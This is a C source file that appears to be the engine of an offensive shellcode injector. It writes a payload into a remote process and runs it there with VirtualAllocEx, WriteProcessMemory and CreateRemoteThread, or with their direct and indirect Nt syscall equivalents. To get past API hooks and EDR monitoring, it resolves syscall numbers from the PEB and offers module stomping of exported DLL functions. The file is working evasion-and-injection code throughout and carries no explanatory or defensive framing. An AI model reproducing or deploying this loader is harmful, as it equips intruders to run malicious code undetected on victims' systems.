#include "runner.h"
#include "..\includes\peb-eat-utils.h"
#include "..\includes\syscall-utils.h"

// Global variables required by indirect assembly stubs
DWORD wNtAllocateVirtualMemorySSN = 0;
UINT_PTR sysAddrNtAllocateVirtualMemory = 0;

DWORD wNtWriteVirtualMemorySSN = 0;
UINT_PTR sysAddrNtWriteVirtualMemory = 0;

DWORD wNtProtectVirtualMemorySSN = 0;
UINT_PTR sysAddrNtProtectVirtualMemory = 0;

DWORD wNtCreateThreadExSSN = 0;
UINT_PTR sysAddrNtCreateThreadEx = 0;

DWORD wNtWaitForSingleObjectSSN = 0;
UINT_PTR sysAddrNtWaitForSingleObject = 0;

// init DFR
P_VirtualAllocEx myVirtualAllocEx = NULL;
P_WriteProcessMemory myWriteProcessMemory = NULL;
P_VirtualProtectEx myVirtualProtectEx = NULL;
P_CreateRemoteThread myCreateRemoteThread = NULL;
P_WaitForSingleObject myWaitForSingleObject = NULL;

// Resolve functions and SSNs
BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
    if(flavor == FLAVOR_DFR) {
        // Obtain a handle to the kernel32.dll module, this will be passed to GetProcAddress
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (hKernel32 == NULL) {
            printf("[ERROR] Failed to get handle to kernel32.dll. Error: %u\n", GetLastError());
            return FALSE;
        }
        
        // Use GPAManualByName to get the address of the VirtualAllocEx function
        myVirtualAllocEx = (P_VirtualAllocEx)GPAManualByName(hKernel32, "VirtualAllocEx");
        if (myVirtualAllocEx == NULL) {
            printf("[ERROR] Failed to resolve VirtualAllocEx. Error: %u\n", GetLastError());
            FreeLibrary(hKernel32); // Clean up the module handle
            return FALSE;
        }

        // Use GPAManualByName to get the address of the WriteProcessMemory function
        myWriteProcessMemory = (P_WriteProcessMemory)GPAManualByName(hKernel32, "WriteProcessMemory");
        if (myWriteProcessMemory == NULL) {
            printf("[ERROR] Failed to resolve WriteProcessMemory. Error: %u\n", GetLastError());
            FreeLibrary(hKernel32); // Clean up the module handle
            return FALSE;
        }

        // Use GPAManualByName to get the address of the VirtualProtectEx function
        myVirtualProtectEx = (P_VirtualProtectEx)GPAManualByName(hKernel32, "VirtualProtectEx");
        if (myVirtualProtectEx == NULL) {
            printf("[ERROR] Failed to resolve VirtualProtectEx. Error: %u\n", GetLastError());
            FreeLibrary(hKernel32); // Clean up the module handle
            return FALSE;
        }

        // Use GPAManualByName to get the address of the CreateRemoteThread function
        myCreateRemoteThread = (P_CreateRemoteThread)GPAManualByName(hKernel32, "CreateRemoteThread");
        if (myCreateRemoteThread == NULL) {
            printf("[ERROR] Failed to resolve CreateRemoteThread. Error: %u\n", GetLastError());
            FreeLibrary(hKernel32); // Clean up the module handle
            return FALSE;
        }	

        myWaitForSingleObject = (P_WaitForSingleObject)GPAManualByName(hKernel32, "WaitForSingleObject");
        if(myWaitForSingleObject == NULL) {
            printf("[ERROR] Failed to resolve WaitForSingleObject. Error: %u\n", GetLastError());
            FreeLibrary(hKernel32); // Clean up the module handle
            return FALSE;            
        }
    } else if(flavor == FLAVOR_INDIRECT) {
        // Get the process PEB for resolving SSNs
        #if defined(_WIN64)
            PPEB pPeb = (PPEB)__readgsqword(0x60);
        #else
            PPEB pPeb = (PPEB)__readfsdword(0x30);
        #endif    
        
        wNtAllocateVirtualMemorySSN = GetSSNByName(pPeb, "NtAllocateVirtualMemory");
        wNtProtectVirtualMemorySSN  = GetSSNByName(pPeb, "NtProtectVirtualMemory");
        wNtWriteVirtualMemorySSN    = GetSSNByName(pPeb, "NtWriteVirtualMemory");
        wNtCreateThreadExSSN        = GetSSNByName(pPeb, "NtCreateThreadEx");
        wNtWaitForSingleObjectSSN   = GetSSNByName(pPeb, "NtWaitForSingleObject");
        
        printf("[+] SSNs Loaded: NtAllocateVirtualMemory(0x%X), NtWriteVirtualMemory(0x%X), NtProtectVirtualMemory(0x%X), NtCreateThreadEx(0x%X), NtWaitForSingleObject(0x%X)\n",
            wNtAllocateVirtualMemorySSN, wNtWriteVirtualMemorySSN, wNtProtectVirtualMemorySSN, wNtCreateThreadExSSN, wNtWaitForSingleObjectSSN);

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            sysAddrNtAllocateVirtualMemory = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtAllocateVirtualMemory"));
            sysAddrNtProtectVirtualMemory  = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtProtectVirtualMemory"));
            sysAddrNtWriteVirtualMemory    = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWriteVirtualMemory"));
            sysAddrNtCreateThreadEx        = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtCreateThreadEx"));
            sysAddrNtWaitForSingleObject   = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWaitForSingleObject"));        
        }
        return TRUE;
    }
    return TRUE;
}

// --- ALLOCATION STRATEGY ---
BOOL DefaultAllocate(PINJECTION_CONTEXT ctx, DWORD protect, SYSCALL_FLAVOR flavor) {
    if (flavor == FLAVOR_WIN32) {
        printf("[*] Allocating memory using Win32\n");
        printf("[-] payloadSize = %lld\n", ctx->payloadSize);
        ctx->pRemoteAddress = VirtualAllocEx(ctx->hProcess, NULL, ctx->payloadSize, MEM_COMMIT | MEM_RESERVE, protect);
        return ctx->pRemoteAddress != NULL;
    }
    else if (flavor == FLAVOR_DFR) {
        printf("[*] Allocating memory using DFR\n");
        ctx->pRemoteAddress = myVirtualAllocEx(ctx->hProcess, NULL, ctx->payloadSize, MEM_COMMIT | MEM_RESERVE, protect);
        return ctx->pRemoteAddress != NULL;    
    }
    else if (flavor == FLAVOR_DIRECT) {
        printf("[*] Allocating memory using SysNtAllocateVirtualMemory\n");
        PVOID baseAddr = NULL;
        SIZE_T regionSize = ctx->payloadSize;
        
        NTSTATUS status = SysNtAllocateVirtualMemory(ctx->hProcess, &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, protect);
        if (status == 0) {
            ctx->pRemoteAddress = baseAddr;
            return TRUE;
        }
        return FALSE;
    }
    else if (flavor == FLAVOR_INDIRECT) {
        printf("[*] Allocating memory using IndirectSysNtAllocateVirtualMemory\n");
        NTSTATUS status = IndirectSysNtAllocateVirtualMemory(
            ctx->hProcess, 
            &(ctx->pRemoteAddress), 
            0, 
            &(ctx->payloadSize), 
            MEM_COMMIT | MEM_RESERVE, 
            protect
        );
        return (status == 0);
    }
    return FALSE;
}


// --- PROTECTION TOGGLE STRATEGY ---
BOOL DefaultProtect(PINJECTION_CONTEXT ctx, DWORD targetProtect, PDWORD pOldProtect, SYSCALL_FLAVOR flavor) {
    if (flavor == FLAVOR_WIN32) {
        return VirtualProtectEx(ctx->hProcess, ctx->pRemoteAddress, ctx->payloadSize, targetProtect, pOldProtect);
    } 
    else if (flavor == FLAVOR_DFR) {
        return myVirtualProtectEx(ctx->hProcess, ctx->pRemoteAddress, ctx->payloadSize, targetProtect, pOldProtect);
    } 
    else if (flavor == FLAVOR_DIRECT) {        
        printf("[*] Toggling permissions with SysNtProtectVirtualMemory\n");
        ULONG oldProt = 0;
        PVOID baseAddr = ctx->pRemoteAddress;
        SIZE_T regionSize = ctx->payloadSize;
        
        NTSTATUS status = SysNtProtectVirtualMemory(ctx->hProcess, &baseAddr, &regionSize, targetProtect, &oldProt);
        if (pOldProtect) *pOldProtect = oldProt;
        return (status == 0);
    }
    else if (flavor == FLAVOR_INDIRECT) {
        printf("[*] Toggling permissions with IndirectSysNtProtectVirtualMemory\n");
        ULONG oldProt = 0;
        PVOID baseAddr = ctx->pRemoteAddress;
        SIZE_T regionSize = ctx->payloadSize;

        NTSTATUS status = IndirectSysNtProtectVirtualMemory(ctx->hProcess, &baseAddr, &regionSize, targetProtect, &oldProt);
        if (pOldProtect) *pOldProtect = oldProt;
        return (status == 0);

        /*
        typedef NTSTATUS(NTAPI* FnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
        
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return FALSE;

        FnNtProtectVirtualMemory pNtProtect = (FnNtProtectVirtualMemory)GPAManualByName(hNtdll, "NtProtectVirtualMemory");
        if (pNtProtect) {
            ULONG oldProt = 0;
            PVOID baseAddr = ctx->pRemoteAddress;
            SIZE_T regionSize = ctx->payloadSize;
            
            NTSTATUS status = pNtProtect(ctx->hProcess, &baseAddr, &regionSize, targetProtect, &oldProt);
            if (pOldProtect) *pOldProtect = oldProt;
            return (status == 0);
        }
        */
    }
    return FALSE;
}

// --- WRITING STRATEGY ---
BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor) {
    if (flavor == FLAVOR_WIN32) {
        printf("[*] Writing payload with WriteProcessMemory\n");
        return WriteProcessMemory(ctx->hProcess, ctx->pRemoteAddress, (PVOID)pPayload, ctx->payloadSize, NULL);
    } 
    else if (flavor == FLAVOR_DFR) {
        printf("[*] Writing payload with WriteProcessMemory\n");
        return myWriteProcessMemory(ctx->hProcess, ctx->pRemoteAddress, (PVOID)pPayload, ctx->payloadSize, NULL);
    }
    else if (flavor == FLAVOR_DIRECT) {
        // if we're doing module stomping with syscalls we need to toggle W permission
        if(ctx->enableStomping) {
            ULONG oldProt = 0;
            printf("[*] Adding W permission to target buffer with direct syscall.\n");
            DefaultProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt, flavor);
        }
        printf("[*] Writing payload with SysNtWriteVirtualMemory.\n");
        SIZE_T bytesWritten = 0;
        NTSTATUS status = SysNtWriteVirtualMemory(ctx->hProcess, ctx->pRemoteAddress, (PVOID)pPayload, ctx->payloadSize, &bytesWritten);
        return (status == 0);
    } 
    else if (flavor == FLAVOR_INDIRECT) {
        // if we're doing module stomping with syscalls we need to toggle W permission
        BOOL writeStatus = FALSE;

        if (ctx->enableStomping) {
            ULONG oldProt = 0;
            printf("[*] Adding W permission to target buffer with indirect syscall.\n");
            
            // 1. Change to RWX
            if (DefaultProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt, flavor)) {
                printf("[*] RWX toggle successful. Writing payload...\n");
                
                // 2. Write the payload while permissions are open
                SIZE_T bytesWritten = 0;
                NTSTATUS status = IndirectSysNtWriteVirtualMemory(
                    ctx->hProcess, 
                    ctx->pRemoteAddress, 
                    (PVOID)pPayload, 
                    ctx->payloadSize, 
                    &bytesWritten
                );

                if (status == 0) { // Assuming NT_SUCCESS
                    writeStatus = (bytesWritten > 0);
                }

                // 3. RESTORE original protections immediately (e.g., back to RX or NOACCESS)
                ULONG tempProt = 0;
                printf("[*] Restoring original memory protections.\n");
                DefaultProtect(ctx, oldProt, &tempProt, flavor);
            } else {
                printf("[-] Error: Failed to change memory protections to RWX.\n");
            }
        } else {
            // Standard execution path if stomping/protection changes aren't requested
            printf("[*] Writing payload directly with IndirectSysNtWriteVirtualMemory.\n");
            SIZE_T bytesWritten = 0;
            IndirectSysNtWriteVirtualMemory(ctx->hProcess, ctx->pRemoteAddress, (PVOID)pPayload, ctx->payloadSize, &bytesWritten);
            writeStatus = (bytesWritten > 0);
        }

        return writeStatus;
    } 
    
    return FALSE;
}

// --- INVOCATION STRATEGY ---
BOOL DefaultInvoke(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
    if (flavor == FLAVOR_WIN32) {
        printf("[*] Invoking payload with CreateRemoteThread\n");
        ctx->hThread = CreateRemoteThread(
            ctx->hProcess,                       
            NULL,                                
            0,                                   
            (LPTHREAD_START_ROUTINE)ctx->pRemoteAddress, 
            NULL,                                
            0,                                   
            NULL                                 
        );
        
        if (ctx->hThread != NULL) {
            WaitForSingleObject(ctx->hThread, INFINITE); 
            return TRUE;
        }
        return FALSE;
    }
    else if (flavor == FLAVOR_DFR) {
        printf("[*] Invoking payload with CreateRemoteThread using DFR (myCreateRemoteThread)\n");
        ctx->hThread = myCreateRemoteThread(
            ctx->hProcess,                       
            NULL,                                
            0,                                   
            (LPTHREAD_START_ROUTINE)ctx->pRemoteAddress, 
            NULL,                                
            0,                                   
            NULL                                 
        );
        
        if (ctx->hThread != NULL) {
            myWaitForSingleObject(ctx->hThread, INFINITE); 
            return TRUE;
        }
        return FALSE;
    }      
    else if (flavor == FLAVOR_DIRECT) {
        printf("[*] Invoking payload with SysNtCreateThreadEx\n");
        NTSTATUS status = SysNtCreateThreadEx(
            &(ctx->hThread), 
            GENERIC_EXECUTE, 
            NULL, 
            ctx->hProcess, 
            ctx->pRemoteAddress, 
            NULL, 
            FALSE, 0, 0, 0, NULL);
        if (status == 0 && ctx->hThread != NULL) {
            SysNtWaitForSingleObject(ctx->hThread, FALSE, NULL);       
            return TRUE;
        }
        return FALSE;
    }
    else if (flavor == FLAVOR_INDIRECT) {
        printf("[*] Invoking payload with IndirectSysNtCreateThreadEx\n");
        NTSTATUS status = IndirectSysNtCreateThreadEx(
            &(ctx->hThread), 
            GENERIC_EXECUTE, 
            NULL, 
            ctx->hProcess, 
            ctx->pRemoteAddress, 
            NULL, 
            FALSE, 0, 0, 0, NULL
        );
        
        if (status == 0 && ctx->hThread != NULL) {
            IndirectSysNtWaitForSingleObject(ctx->hThread, FALSE, NULL);
            return TRUE;
        }
        return FALSE;
    } 
    
    return FALSE;
}

// --- ENGINE EXECUTION ---
BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor, DWORD finalProtect) {
    if (!engine->Allocate || !engine->Write || !engine->Protect || !engine->Invoke) return FALSE;

    LPVOID pPeb = GetPebAddress(ctx->hProcess);
    
    if(flavor == FLAVOR_DFR || flavor == FLAVOR_INDIRECT) {
        printf("[*] Initializing Dynamic Resolvers.\n");
        InitializeResolvers(flavor);
    }

    // For module stomping, we need to locate an address and set ctx->pRemoteAddress
    if(ctx->enableStomping) {
        printf("[*] Module stomping is enabled.\n");
        printf("[*] Targeting module: %s.\n", ctx->targetModule);    
        printf("[*] Attempting to locate the module base for %s.\n", ctx->targetModule);
        PVOID targetModuleBase = GetModuleBaseManualRemote(ctx->hProcess, pPeb, ctx->targetModule);
        if (!targetModuleBase) {
            printf("[ERROR] Failed to locate target module base.\n");
            CloseHandle(ctx->hProcess);
            return -1;        
        }

        printf("[*] Target DLL base located at: : 0x%016llx\n", (ULONG_PTR)targetModuleBase);        

        LPVOID bufferAddress = NULL;

        if(ctx->targetOffset != 0) {
            if(ctx->targetExport != NULL) {
                printf("[!] Warning: both a target export and a target offset were provided.\n    Prioritizing the offset value over the export name.\n    Double-check your parameters.\n");
            }
            printf("[*] Locating offset address: %ld.\n", ctx->targetOffset);
            printf("[*] Applying RVA offset 0x%X directly from Image Base\n", ctx->targetOffset);
            bufferAddress = (LPVOID)((PBYTE)targetModuleBase + ctx->targetOffset);
        } else if(ctx->targetExport != NULL) {
            printf("[*] Locating export address: %s.\n", ctx->targetExport);
            printf("[*] Attempting to locate function: %s\n", ctx->targetExport);
            bufferAddress = (LPVOID)GetRemoteProcAddressManual(ctx->hProcess, targetModuleBase, ctx->targetExport);  
            if (bufferAddress == NULL) {
                printf("[ERROR] Failed to locate target function %s! Error: %lu\n", ctx->targetExport, GetLastError());
                CloseHandle(ctx->hProcess);
                return -1;
            }        
            printf("[*] Target %s!%s located at: 0x%016llx\n", ctx->targetModule, ctx->targetExport, (ULONG_PTR)bufferAddress);
            ctx->pRemoteAddress = bufferAddress;
        } else {                    
            printf("[*] No export or offset provided, targeting the first exported function.\n");
            // TODO: complete
        }
    } else {
        printf("[+] Starting allocation phase.\n");
        if (!engine->Allocate(ctx, PAGE_READWRITE, flavor)) {
            printf("[!] Error: Allocation failed.\n");
            return FALSE;
        } 
        printf("[+] Space allocated at: 0x%p\n", ctx->pRemoteAddress);
    }

    // Deploy payload (decrypt, write)
    printf("[+] Starting to write payload.\n");   
    if (!engine->Write(ctx, pPayload, flavor)) {
        printf("[!] Write operation failed!\n");
        return FALSE;
    }

    // no module stomping = toggle RX
    // module stomping + win32 or DFR doesn't require a toggle RX
    // module stomping + direct and indirect require a toggle to RX
    if(ctx->enableStomping == FALSE) {
        printf("[+] Flipping page protection.\n");
        DWORD oldProtect = 0;
        if (!engine->Protect(ctx, PAGE_EXECUTE, &oldProtect, flavor)) return FALSE;
        printf("[+] Page protections flipped to target execution permissions.\n");
    }

    printf("[+] Payload staging complete.\n");

    // Execution of the payload
    if (!engine->Invoke(ctx, flavor)) return FALSE;
    printf("[+] Thread execution complete.\n");

    return TRUE;
}